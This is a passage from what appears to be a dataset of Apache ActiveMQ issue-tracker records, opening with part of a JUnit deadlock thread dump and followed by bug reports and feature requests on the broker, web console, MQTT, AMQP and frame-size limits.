org.apache.activemq.network.DemandForwardingBridge.serviceRemoteCommand(DemandForwardingBridge.java:250)    &#91;junit&#93;     - locked <0x1c4f47b0> (a java.lang.Object)    &#91;junit&#93;     at org.apache.activemq.network.DemandForwardingBridge$2.onCommand(DemandForwardingBridge.java:121)    &#91;junit&#93;     at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)    &#91;junit&#93;     at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)    &#91;junit&#93;     at org.apache.activemq.transport.failover.FailoverTransport$1.onCommand(FailoverTransport.java:103)    &#91;junit&#93;     at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:105)    &#91;junit&#93;     at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:77)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "ActiveMQ Default Thread Pool Thread" daemon prio=5 tid=0x0052afc0 nid=0x18e5600 in Object.wait() &#91;0xf1112000..0xf1112ad0&#93;    &#91;junit&#93;     at java.lang.Object.wait(Native Method)    &#91;junit&#93;     - waiting on <0x1c4a8840> (a java.lang.Object)    &#91;junit&#93;     at java.lang.Object.wait(Object.java:474)    &#91;junit&#93;     at edu.emory.mathcs.backport.java.util.concurrent.DelayQueue.take(DelayQueue.java:152)    &#91;junit&#93;     - locked <0x1c4a8840> (a java.lang.Object)    &#91;junit&#93;     at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:470)    &#91;junit&#93;     at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:667)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "Transport Status Dector org.apache.activemq.broker.TransportConnector@426f2d" daemon prio=9 tid=0x00529180 nid=0x18e5200 waiting on condition &#91;0xf1091000..0xf1091ad0&#93;    &#91;junit&#93;     at java.lang.Thread.sleep(Native Method)    &#91;junit&#93;     at org.apache.activemq.broker.TransportStatusDetector.run(TransportStatusDetector.java:98)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "MulticastDiscovery: null" daemon prio=5 tid=0x00528760 nid=0x18e5a00 runnable &#91;0xf1010000..0xf1010ad0&#93;    &#91;junit&#93;     at java.net.PlainDatagramSocketImpl.receive0(Native Method)    &#91;junit&#93;     at java.net.PlainDatagramSocketImpl.receive(PlainDatagramSocketImpl.java:136)    &#91;junit&#93;     - locked <0x1c3e7818> (a java.net.PlainDatagramSocketImpl)    &#91;junit&#93;     at java.net.DatagramSocket.receive(DatagramSocket.java:712)    &#91;junit&#93;     - locked <0x1c3e7858> (a java.net.DatagramPacket)    &#91;junit&#93;     - locked <0x1c3e7878> (a java.net.MulticastSocket)    &#91;junit&#93;     at org.apache.activemq.transport.discovery.multicast.MulticastDiscoveryAgent.run(MulticastDiscoveryAgent.java:239)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "Transport Status Dector org.apache.activemq.broker.TransportConnector@f0bca1" daemon prio=9 tid=0x00528420 nid=0x18e4e00 waiting on condition &#91;0xf0f8f000..0xf0f8fad0&#93;    &#91;junit&#93;     at java.lang.Thread.sleep(Native Method)    &#91;junit&#93;     at org.apache.activemq.broker.TransportStatusDetector.run(TransportStatusDetector.java:98)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "MulticastDiscovery: tcp://bigmac-6.local:53745" daemon prio=5 tid=0x00527c80 nid=0x18e4a00 runnable &#91;0xf0f0e000..0xf0f0ead0&#93;    &#91;junit&#93;     at java.net.PlainDatagramSocketImpl.receive0(Native Method)    &#91;junit&#93;     at java.net.PlainDatagramSocketImpl.receive(PlainDatagramSocketImpl.java:136)    &#91;junit&#93;     - locked <0x1c3e99f8> (a java.net.PlainDatagramSocketImpl)    &#91;junit&#93;     at java.net.DatagramSocket.receive(DatagramSocket.java:712)    &#91;junit&#93;     - locked <0x1c3e9a38> (a java.net.DatagramPacket)    &#91;junit&#93;     - locked <0x1c3e9a58> (a java.net.MulticastSocket)    &#91;junit&#93;     at org.apache.activemq.transport.discovery.multicast.MulticastDiscoveryAgent.run(MulticastDiscoveryAgent.java:239)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "TcpTransportServer@tcp://bigmac-6.local:53745" daemon prio=9 tid=0x00527800 nid=0x18e4600 runnable &#91;0xf0e8d000..0xf0e8dad0&#93;    &#91;junit&#93;     at java.net.PlainSocketImpl.socketAccept(Native Method)    &#91;junit&#93;     at java.net.PlainSocketImpl.accept(PlainSocketImpl.java:384)    &#91;junit&#93;     - locked <0x1c3dd958> (a java.net.SocksSocketImpl)    &#91;junit&#93;     at java.net.ServerSocket.implAccept(ServerSocket.java:450)    &#91;junit&#93;     at java.net.ServerSocket.accept(ServerSocket.java:421)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpTransportServer.run(TcpTransportServer.java:96)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "ActiveMQ Scheduler" daemon prio=5 tid=0x005268c0 nid=0x18e4200 in Object.wait() &#91;0xf0e0c000..0xf0e0cad0&#93;    &#91;junit&#93;     at java.lang.Object.wait(Native Method)    &#91;junit&#93;     - waiting on <0x1c3d6210> (a java.lang.Object)    &#91;junit&#93;     at java.lang.Object.wait(Object.java:432)    &#91;junit&#93;     at edu.emory.mathcs.backport.java.util.concurrent.TimeUnit.timedWait(TimeUnit.java:294)    &#91;junit&#93;     at edu.emory.mathcs.backport.java.util.concurrent.DelayQueue.take(DelayQueue.java:156)    &#91;junit&#93;     - locked <0x1c3d6210> (a java.lang.Object)    &#91;junit&#93;     at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:470)    &#91;junit&#93;     at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:667)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "derby.rawStoreDaemon" daemon prio=5 tid=0x00516e60 nid=0x184d000 in Object.wait() &#91;0xf0d0a000..0xf0d0aad0&#93;    &#91;junit&#93;     at java.lang.Object.wait(Native Method)    &#91;junit&#93;     - waiting on <0x1c2e5f50> (a org.apache.derby.impl.services.daemon.BasicDaemon)    &#91;junit&#93;     at org.apache.derby.impl.services.daemon.BasicDaemon.rest(Unknown Source)    &#91;junit&#93;     - locked <0x1c2e5f50> (a org.apache.derby.impl.services.daemon.BasicDaemon)    &#91;junit&#93;     at org.apache.derby.impl.services.daemon.BasicDaemon.run(Unknown Source)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "derby.antiGC" daemon prio=1 tid=0x00515d80 nid=0x18b5400 in Object.wait() &#91;0xf0c89000..0xf0c89ad0&#93;    &#91;junit&#93;     at java.lang.Object.wait(Native Method)    &#91;junit&#93;     - waiting on <0x1c2c60c8> (a org.apache.derby.impl.services.monitor.AntiGC)    &#91;junit&#93;     at java.lang.Object.wait(Object.java:474)    &#91;junit&#93;     at org.apache.derby.impl.services.monitor.AntiGC.run(Unknown Source)    &#91;junit&#93;     - locked <0x1c2c60c8> (a org.apache.derby.impl.services.monitor.AntiGC)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; "Low Memory Detector" daemon prio=5 tid=0x0050b0a0 nid=0x1813c00 runnable &#91;0x00000000..0x00000000&#93;    &#91;junit&#93;     &#91;junit&#93; "CompilerThread0" daemon prio=10 tid=0x0050a6e0 nid=0x1813800 waiting on condition &#91;0x00000000..0xf0b06378&#93;    &#91;junit&#93;     &#91;junit&#93; "Signal Dispatcher" daemon prio=10 tid=0x0050a220 nid=0x1812a00 waiting on condition &#91;0x00000000..0x00000000&#93;    &#91;junit&#93;     &#91;junit&#93; "Finalizer" daemon prio=8 tid=0x005099b0 nid=0x1811800 in Object.wait() &#91;0xf0a04000..0xf0a04ad0&#93;    &#91;junit&#93;     at java.lang.Object.wait(Native Method)    &#91;junit&#93;     - waiting on <0x1c1fbc60> (a java.lang.ref.ReferenceQueue$Lock)    &#91;junit&#93;     at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:116)    &#91;junit&#93;     - locked <0x1c1fbc60> (a java.lang.ref.ReferenceQueue$Lock)    &#91;junit&#93;     at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:132)    &#91;junit&#93;     at java.lang.ref.Finalizer$FinalizerThread.run(Finalizer.java:159)    &#91;junit&#93;     &#91;junit&#93; "Reference Handler" daemon prio=10 tid=0x005095e0 nid=0x1810800 in Object.wait() &#91;0xf0983000..0xf0983ad0&#93;    &#91;junit&#93;     at java.lang.Object.wait(Native Method)    &#91;junit&#93;     - waiting on <0x1c1fbce0> (a java.lang.ref.Reference$Lock)    &#91;junit&#93;     at java.lang.Object.wait(Object.java:474)    &#91;junit&#93;     at java.lang.ref.Reference$ReferenceHandler.run(Reference.java:116)    &#91;junit&#93;     - locked <0x1c1fbce0> (a java.lang.ref.Reference$Lock)    &#91;junit&#93;     &#91;junit&#93; "main" prio=5 tid=0x00501ad0 nid=0x1805400 in Object.wait() &#91;0xf07ff000..0xf08002e0&#93;    &#91;junit&#93;     at java.lang.Object.wait(Native Method)    &#91;junit&#93;     - waiting on <0x1c818088> (a org.apache.activemq.thread.SimpleTaskRunner$1)    &#91;junit&#93;     at java.lang.Object.wait(Object.java:474)    &#91;junit&#93;     at org.apache.activemq.thread.SimpleTaskRunner.shutdown(SimpleTaskRunner.java:88)    &#91;junit&#93;     - locked <0x1c818088> (a org.apache.activemq.thread.SimpleTaskRunner$1)    &#91;junit&#93;     at org.apache.activemq.ActiveMQSessionExecutor.stop(ActiveMQSessionExecutor.java:110)    &#91;junit&#93;     at org.apache.activemq.ActiveMQSession.stop(ActiveMQSession.java:1431)    &#91;junit&#93;     at org.apache.activemq.ActiveMQConnection.stop(ActiveMQConnection.java:464)    &#91;junit&#93;     at org.apache.activemq.ActiveMQConnection.close(ActiveMQConnection.java:516)    &#91;junit&#93;     at org.apache.activemq.transport.TopicClusterTest.tearDown(TopicClusterTest.java:98)    &#91;junit&#93;     at junit.framework.TestCase.runBare(TestCase.java:130)    &#91;junit&#93;     at junit.framework.TestResult$1.protect(TestResult.java:106)    &#91;junit&#93;     at junit.framework.TestResult.runProtected(TestResult.java:124)    &#91;junit&#93;     at junit.framework.TestResult.run(TestResult.java:109)    &#91;junit&#93;     at junit.framework.TestCase.run(TestCase.java:118)    &#91;junit&#93;     at junit.framework.TestSuite.runTest(TestSuite.java:208)    &#91;junit&#93;     at junit.framework.TestSuite.run(TestSuite.java:203)    &#91;junit&#93;     at org.apache.tools.ant.taskdefs.optional.junit.JUnitTestRunner.run(JUnitTestRunner.java:325)    &#91;junit&#93;     at org.apache.tools.ant.taskdefs.optional.junit.JUnitTestRunner.main(JUnitTestRunner.java:536)    &#91;junit&#93;     &#91;junit&#93; "VM Thread" prio=10 tid=0x00508e60 nid=0x1803c00 runnable     &#91;junit&#93;     &#91;junit&#93; "VM Periodic Task Thread" prio=10 tid=0x0050c760 nid=0x1814000 waiting on condition     &#91;junit&#93;     &#91;junit&#93; "Exception Catcher Thread" prio=10 tid=0x00501cd0 nid=0x1806a00 runnable     &#91;junit&#93;     &#91;junit&#93; Found one Java-level deadlock:    &#91;junit&#93; =============================    &#91;junit&#93; "session Task":    &#91;junit&#93;   waiting to lock monitor 0x01810e68 (object 0x1c926760, a java.util.LinkedList),    &#91;junit&#93;   which is held by "tcp://localhost/127.0.0.1:53745"    &#91;junit&#93; "tcp://localhost/127.0.0.1:53745":    &#91;junit&#93;   waiting to lock monitor 0x01810e8c (object 0x1c8c9340, a org.apache.activemq.broker.region.QueueSubscription),    &#91;junit&#93;   which is held by "session Task"    &#91;junit&#93;     &#91;junit&#93; Java stack information for the threads listed above:    &#91;junit&#93; ===================================================    &#91;junit&#93; "session Task":    &#91;junit&#93;     at org.apache.activemq.broker.region.Queue.dropEvent(Queue.java:263)    &#91;junit&#93;     - waiting to lock <0x1c926760> (a java.util.LinkedList)    &#91;junit&#93;     at org.apache.activemq.broker.region.QueueSubscription.acknowledge(QueueSubscription.java:55)    &#91;junit&#93;     at org.apache.activemq.broker.region.PrefetchSubscription.acknowledge(PrefetchSubscription.java:133)    &#91;junit&#93;     - locked <0x1c8c9340> (a org.apache.activemq.broker.region.QueueSubscription)    &#91;junit&#93;     at org.apache.activemq.broker.region.AbstractRegion.acknowledge(AbstractRegion.java:203)    &#91;junit&#93;     at org.apache.activemq.broker.region.RegionBroker.acknowledge(RegionBroker.java:329)    &#91;junit&#93;     at org.apache.activemq.broker.TransactionBroker.acknowledge(TransactionBroker.java:176)    &#91;junit&#93;     at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:59)    &#91;junit&#93;     at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:59)    &#91;junit&#93;     at org.apache.activemq.broker.MutableBrokerFilter.acknowledge(MutableBrokerFilter.java:71)    &#91;junit&#93;     at org.apache.activemq.broker.AbstractConnection.processMessageAck(AbstractConnection.java:342)    &#91;junit&#93;     at org.apache.activemq.command.MessageAck.visit(MessageAck.java:178)    &#91;junit&#93;     at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:190)    &#91;junit&#93;     at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:60)    &#91;junit&#93;     at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)    &#91;junit&#93;     at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)    &#91;junit&#93;     at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:75)    &#91;junit&#93;     at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:44)    &#91;junit&#93;     - locked <0x1c8180d8> (a java.lang.Object)    &#91;junit&#93;     at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:54)    &#91;junit&#93;     at org.apache.activemq.ActiveMQConnection.asyncSendPacket(ActiveMQConnection.java:1041)    &#91;junit&#93;     at org.apache.activemq.ActiveMQSession.asyncSendPacket(ActiveMQSession.java:1617)    &#91;junit&#93;     at org.apache.activemq.ActiveMQMessageConsumer.afterMessageIsConsumed(ActiveMQMessageConsumer.java:554)    &#91;junit&#93;     at org.apache.activemq.ActiveMQMessageConsumer.dispatch(ActiveMQMessageConsumer.java:716)    &#91;junit&#93;     at org.apache.activemq.ActiveMQSessionExecutor.dispatch(ActiveMQSessionExecutor.java:93)    &#91;junit&#93;     at org.apache.activemq.ActiveMQSessionExecutor.iterate(ActiveMQSessionExecutor.java:146)    &#91;junit&#93;     at org.apache.activemq.thread.SimpleTaskRunner.runTask(SimpleTaskRunner.java:110)    &#91;junit&#93;     at org.apache.activemq.thread.SimpleTaskRunner.access$100(SimpleTaskRunner.java:25)    &#91;junit&#93;     at org.apache.activemq.thread.SimpleTaskRunner$1.run(SimpleTaskRunner.java:43)    &#91;junit&#93;     at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:643)    &#91;junit&#93;     at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:668)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93; "tcp://localhost/127.0.0.1:53745":    &#91;junit&#93;     at org.apache.activemq.broker.region.PrefetchSubscription.add(PrefetchSubscription.java:58)    &#91;junit&#93;     - waiting to lock <0x1c8c9340> (a org.apache.activemq.broker.region.QueueSubscription)    &#91;junit&#93;     at org.apache.activemq.broker.region.QueueSubscription.add(QueueSubscription.java:38)    &#91;junit&#93;     at org.apache.activemq.broker.region.policy.RoundRobinDispatchPolicy.dispatch(RoundRobinDispatchPolicy.java:53)    &#91;junit&#93;     - locked <0x1c926f28> (a edu.emory.mathcs.backport.java.util.concurrent.CopyOnWriteArrayList)    &#91;junit&#93;     at org.apache.activemq.broker.region.Queue.removeSubscription(Queue.java:210)    &#91;junit&#93;     - locked <0x1c926760> (a java.util.LinkedList)    &#91;junit&#93;     at org.apache.activemq.broker.region.AbstractRegion.removeConsumer(AbstractRegion.java:179)    &#91;junit&#93;     at org.apache.activemq.broker.region.RegionBroker.removeConsumer(RegionBroker.java:280)    &#91;junit&#93;     at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:95)    &#91;junit&#93;     at org.apache.activemq.advisory.AdvisoryBroker.removeConsumer(AdvisoryBroker.java:164)    &#91;junit&#93;     at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:95)    &#91;junit&#93;     at org.apache.activemq.broker.MutableBrokerFilter.removeConsumer(MutableBrokerFilter.java:107)    &#91;junit&#93;     at org.apache.activemq.broker.AbstractConnection.processRemoveConsumer(AbstractConnection.java:431)    &#91;junit&#93;     at org.apache.activemq.command.RemoveInfo.visit(RemoveInfo.java:63)    &#91;junit&#93;     at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:190)    &#91;junit&#93;     at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:60)    &#91;junit&#93;     at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)    &#91;junit&#93;     at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)    &#91;junit&#93;     at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:75)    &#91;junit&#93;     at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:44)    &#91;junit&#93;     - locked <0x1c80aac8> (a java.lang.Object)    &#91;junit&#93;     at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:54)    &#91;junit&#93;     at org.apache.activemq.network.DemandForwardingBridge.serviceRemoteConsumerAdvisory(DemandForwardingBridge.java:331)    &#91;junit&#93;     at org.apache.activemq.network.DemandForwardingBridge.serviceRemoteCommand(DemandForwardingBridge.java:235)    &#91;junit&#93;     at org.apache.activemq.network.DemandForwardingBridge$2.onCommand(DemandForwardingBridge.java:121)    &#91;junit&#93;     at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)    &#91;junit&#93;     at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)    &#91;junit&#93;     at org.apache.activemq.transport.failover.FailoverTransport$1.onCommand(FailoverTransport.java:103)    &#91;junit&#93;     at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:105)    &#91;junit&#93;     at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:77)    &#91;junit&#93;     at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)    &#91;junit&#93;     at java.lang.Thread.run(Thread.java:613)    &#91;junit&#93;     &#91;junit&#93; Found 1 deadlock.
issueID:AMQ-5750
type:Improvement
changed files:TaskRunnerFactory.java
texts:Add exception handler to TaskRunnerFactory
The TaskRunnerFactory class in activemq-client creates a default executor but doesn"t set an uncaught exception handler.  This should be added so uncaught errors show up in the log for the created threads.  This is similar to how the getExecutor method in BrokerService sets an uncaught exception handler.
issueID:AMQ-5751
type:New Feature
changed files:
texts:Configuration to limit the number of Topics/Queues that can be created on broker
It would be good to have a configuration with which we can limit the number of topics/queues that can be created in ActiveMQ setup.The will help in cases where some client creates thousands of queues/topics and can potentially affect broker service.For e.g. by default each queue also creates a dispatcher thread so having tens of thousands of queues in one go can potentially cause DOS in broker setup.
issueID:AMQ-5752
type:Bug
changed files:
texts:Move and copy message does not work in web console
When moving a message with web console (clicking message, select target queue and press move) the message get"s lost.The following message is found in the ActiveMQ log. It"s wierd since a move should not trigger a duplicate error since the message should be moved.` INFO | Moving message FROM(ID:petters-mbp.got.vgregion.se-65058-1430309626002-5:1:1:1:1) to TO WARN | org.apache.activemq.broker.region.cursors.QueueStorePrefetch@42db79bc:TO,batchResetNeeded=false,size=0,cacheEnabled=true,maxBatchSize:1,hasSpace:true,pendingCachedIds.size:1,lastSyncCachedId:null,lastSyncCachedId-seq:null,lastAsyncCachedId:null,lastAsyncCachedId-seq:null,store=permits:9999,sd=nextSeq:3,lastRet:MessageOrderCursor:&#91;def:0, low:0, high:0&#93;,pending:0 - cursor got duplicate send ID:petters-mbp.got.vgregion.se-65058-1430309626002-5:1:1:1:1 seq: org.apache.activemq.store.kahadb.KahaDBStore$StoreQueueTask$InnerFutureTask@38864035 WARN | Duplicate message add attempt rejected. Destination: QUEUE://TO, Message id: ID:petters-mbp.got.vgregion.se-65058-1430309626002-5:1:1:1:1`The same problem goes for "copy". But, the original message does not get deleted. The error in the log is similar:`INFO | FROM(ID:petters-mbp.got.vgregion.se-65058-1430309626002-5:1:1:1:1) copy to TO WARN | org.apache.activemq.broker.region.cursors.QueueStorePrefetch@42db79bc:TO,batchResetNeeded=false,size=0,cacheEnabled=true,maxBatchSize:1,hasSpace:true,pendingCachedIds.size:1,lastSyncCachedId:null,lastSyncCachedId-seq:null,lastAsyncCachedId:null,lastAsyncCachedId-seq:null,store=permits:9999,sd=nextSeq:1,lastRet:MessageOrderCursor:&#91;def:0, low:0, high:0&#93;,pending:0 - cursor got duplicate send ID:petters-mbp.got.vgregion.se-65058-1430309626002-5:1:1:1:1 seq: org.apache.activemq.store.kahadb.KahaDBStore$StoreQueueTask$InnerFutureTask@571547ee WARN | Duplicate message add attempt rejected. Destination: QUEUE://TO, Message id: ID:petters-mbp.got.vgregion.se-65058-1430309626002-5:1:1:1:1`The problem with move is a bit critical since it can cause loss of important data.Verified in AMQ 5.11.0 and 5.11.1
issueID:AMQ-5754
type:Improvement
changed files:
texts:Disable /fileserver feature by default
It"s an extremely rarely used feature for transferring blobs. Folks that use it, will usually use external ftp/file server instead of an embedded one.
issueID:AMQ-5755
type:Improvement
changed files:
texts:Add some tests for STOMP over WebSockets and fix and improve close handling
Add some tests using the Jetty WebSocket client to cover STOMP over websockets and fix some issues with connection close and inactivity handling on the broker side.  We want to ensure that on close or inactivity that we shut down the StompSocket resources.
issueID:AMQ-5757
type:New Feature
changed files:
texts:AMQP: Add support for heartbeats and inactivity monitoring.
After we update to Proton-J 0.9.1 we will be able to take advantage if the idle processing added in that release to send empty keep alive frames in order to keep idle connections active and detect dropped connections.
issueID:AMQ-5758
type:Bug
changed files:DefaultIOExceptionHandler.java
texts:DefaultIOExceptionHandler causing NPE
DefaultIOExceptionHandler handles SQLException without checking if message is not null. This can cause NPE been thrown.
issueID:AMQ-5760
type:Improvement
changed files:WebConsoleStarter.java
texts:ActiveMQ - Output url to the rest api when starting AMQ
We output the url for the web console, but we should also output links to the rest api.
issueID:AMQ-5762
type:Bug
changed files:KahaDBStore.java
texts:Severe memory leak in the MQTT connector
When an MQTT connection is closed some memory is not released. In case of the soft close (calling connection close on the client) memory leaks at the rate of 70K per connection close. In case of the hard close (pulling the wire, or cutting off the network connection) the leak goes at the rate of 300K per close. we also checked it on version 5.11 - same problem
issueID:AMQ-5763
type:Bug
changed files:
texts:Consume messages in transactions with AMQP stop after 500 messages
I try to consume messages via AMQP in transactions (1 message per transaction),  The consumption is stopped exactly after 500 messages. I am using qpid-jms AMQP client, but i have also reproduced this issue using SwiftMQ AMQP client. This issue happen only with ActiveMQ (my version is 5.11.1). For example on Qpid Java Broker(version 0.32) it is working correctly.I have created sample test which may be used for issue reproduction. For reproduction please use following instructions:  Download amqptxerror.zip Unzip. Import pom.xml to your favorite IDE. Start your ActiveMQ broker or run maven with "-p broker". Run src/test/java/AMQPTxTest.java.
issueID:AMQ-5768
type:Improvement
changed files:Topic.java
texts:Exclude Advisory Topics from expired message processing.
Currently Advisory Topics are included in the Topic checks for expired messages, however advisory Topics will not have messages will TTL so there is no need to schedule the task to periodically check them.
issueID:AMQ-5770
type:Bug
changed files:
texts:activemq-web-console feature doesn&#39;t install in Karaf 4 SNAPSHOT
feature:install activemq-web-console fails with Error executing command: Unable to resolve root: missing requirement [root] osgi.identity; osgi.identity=activemq-web-console; type=karaf.feature; version="[5.12.0.SNAPSHOT,5.12.0.SNAPSHOT]"; filter:="(&(osgi.identity=activemq-web-console)(type=karaf.feature)(version>=5.12.0.SNAPSHOT)(version<=5.12.0.SNAPSHOT))" [caused by: Unable to resolve activemq-web-console/5.12.0.SNAPSHOT: missing requirement [activemq-web-console/5.12.0.SNAPSHOT] osgi.identity; osgi.identity=org.apache.activemq.activemq-web-console; type=osgi.bundle; version="[5.12.0.SNAPSHOT,5.12.0.SNAPSHOT]"; resolution:=mandatory [caused by: Unable to resolve org.apache.activemq.activemq-web-console/5.12.0.SNAPSHOT: missing requirement [org.apache.activemq.activemq-web-console/5.12.0.SNAPSHOT] osgi.wiring.package; filter:="(&(osgi.wiring.package=javax.servlet.resources)(version>=2.5.0)(!(version>=4.0.0)))"]]As this package seems not to be used in the web console, an it not be removed? I"ve tested locally with this changediff --git a/activemq-web-console/pom.xml b/activemq-web-console/pom.xmlindex 1f1e641..4bdbe51 100755--- a/activemq-web-console/pom.xml+++ b/activemq-web-console/pom.xml@@ -142,7 +142,6 @@               org.w3c.dom,               javax.servlet;version="[2.5,4)",               javax.servlet.http;version="[2.5,4)",-              javax.servlet.resources;version="[2.5,4)",               javax.servlet.jsp,               javax.servlet.jsp.tagext,               javax.servlet.jsp.el,And web console works if ActiveMQ is started standalone and deployed into Karaf 4.
issueID:AMQ-5771
type:New Feature
changed files:TransportConnection.java
texts:In the logs add remote IP address in case of authentication failure
In case of authentication failure, ActiveMQ currently logs something like:2015-02-27 13:56:59,740 [ActiveMQ NIO Worker 7126] WARN Service - Security Error occurred: User name [_________] or password is invalid. In order to find the culprit client, it would be very useful to add the remote IP address (and port) used while authenticating. Currently we see that the timeout warnings do log such information: [InactivityMonitor Async Task: java.util.concurrent.ThreadPoolExecutor$Worker@4182d5fc[State = -1, empty queue]] WARN Transport - Transport Connection to: tcp://130.120.110.33:39338 failed: org.apache.activemq.transport.InactivityIOException: Channel was inactive for too (>3600000) long: tcp://130.120.110.33:39338
issueID:AMQ-5772
type:Improvement
changed files:
texts:Improve removeConnection()
Broker.removeConnection() has Throwable argument that can be used by plugins to determine the cause of connection removal (exception, slow consumer, link stealing, etc.). At the moment, this argument is not used. We should start using it.
issueID:AMQ-5775
type:Bug
changed files:
texts:Web console queue graph encoding
Some values are left un-encoded on this page
issueID:AMQ-5776
type:New Feature
changed files:
texts:Implement and test maxFrameSize across all protocols
The maxFrameSize option that currently exists for the OpenWire protocol should be implemented and tested across all protocols based on the discussion seen here: AMQ-5774.  This will help pevent DOS attacks across any protocol that is used.  Subtasks will be created for the different protocol/transports.
issueID:AMQ-5777
type:Sub-task
changed files:
texts:Implement and test maxFrameSize for STOMP
Implement and test maxFameSize for STOMP to help prevent DOS attacks.  Testing should include TCP, SSL, NIO and NIO+SSL, etc.
issueID:AMQ-5778
type:Sub-task
changed files:
texts:AMQP: Add coverage tests for maxFrameSize handling
Implement proper tests to cover the application of the Transport maxFrameSize setting for AMQP and fix any issues that arise during the testing.
issueID:AMQ-578
type:Bug
changed files:PrefetchSubscription.java
texts:Invalid Acknowledgement on onMessage  inside a transaction
test case for this issue is at ..usecasesPublishOnQueueConsumedMessageInTransactionTest . a  "javax.jms.JMSException: Invalid acknowledgment:" occurs when running a session.commit() inside onMessage() in a transaction.   This doesnt get replicated  replicated when using  consumer.receive().The warning message is not thrown back to the client  and only displayed on the broker console.  To see the message modify the test case to connect to a remote broker.http://forums.activemq.org/posts/list/364.pagehttp://forums.activemq.org/posts/list/320.page
issueID:AMQ-5781
type:Sub-task
changed files:
texts:MQTT: Allow for configuring maxFrameSize and enforce it across TCP, SSL, NIO and NIO+SSL
Allow for transport configuration in MQTT of transport.maxFrameSize to control the max size of incoming mqtt messages.
issueID:AMQ-5782
type:Bug
changed files:
texts:Resource Adapter doesn&#39;t support SSL
The Resource Adapter doesn"t allow the setting of Keystores and Trustores. The RAR needs to be updated to allow the setting of these parameters.
issueID:AMQ-5783
type:Bug
changed files:
texts:Failed to browse Topic: XXXXX java.io.EOFException: Chunk stream does not exist, page: y is marked free
When an offline durable subscriber is timed out (offlineDurableSubscriberTimeout configured) periodically see the following WARNING message.   2015-05-13 13:45:08,472 [sage] Scheduler] - WARN  Topic                          - Failed to browse Topic: XXXXXjava.io.EOFException: Chunk stream does not exist, page: 39 is marked free at org.apache.activemq.store.kahadb.disk.page.Transaction$2.readPage(Transaction.java:470) at org.apache.activemq.store.kahadb.disk.page.Transaction$2.<init>(Transaction.java:447) at org.apache.activemq.store.kahadb.disk.page.Transaction.openInputStream(Transaction.java:444) at org.apache.activemq.store.kahadb.disk.page.Transaction.load(Transaction.java:420) at org.apache.activemq.store.kahadb.disk.page.Transaction.load(Transaction.java:377) at org.apache.activemq.store.kahadb.disk.index.BTreeIndex.loadNode(BTreeIndex.java:266) at org.apache.activemq.store.kahadb.disk.index.BTreeIndex.getRoot(BTreeIndex.java:174) at org.apache.activemq.store.kahadb.disk.index.BTreeIndex.iterator(BTreeIndex.java:236) at org.apache.activemq.store.kahadb.MessageDatabase$MessageOrderIndex$MessageOrderIterator.<init>(MessageDatabase.java:3033) at org.apache.activemq.store.kahadb.MessageDatabase$MessageOrderIndex.iterator(MessageDatabase.java:2985) at 